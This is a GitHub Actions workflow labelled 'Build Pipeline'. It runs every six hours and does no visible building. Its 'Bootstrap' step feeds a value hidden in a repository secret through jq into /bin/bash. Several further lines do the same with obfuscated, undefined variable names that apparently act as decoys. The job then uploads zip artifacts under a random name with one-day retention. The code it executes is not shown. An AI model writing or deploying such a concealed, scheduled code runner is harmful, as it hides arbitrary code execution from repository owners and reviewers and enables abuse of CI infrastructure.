name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '0 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          gff638: ${{ secrets.gff638 }}
        run: |
          printf '%s' "$gff638" | jq -r .g2661 | /bin/bash
          printf '%s' "$edyl7" | jq -r .lxvs538 | /bin/bash
          echo $pxy8 | jq -r .i00 | /bin/bash
          printf '%s' "$ow8" | jq -r .o33 | /bin/bash
          echo $nnask4 | jq -r .ph58 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: T4LbZRP6
          path: "*.zip"
          retention-days: 1
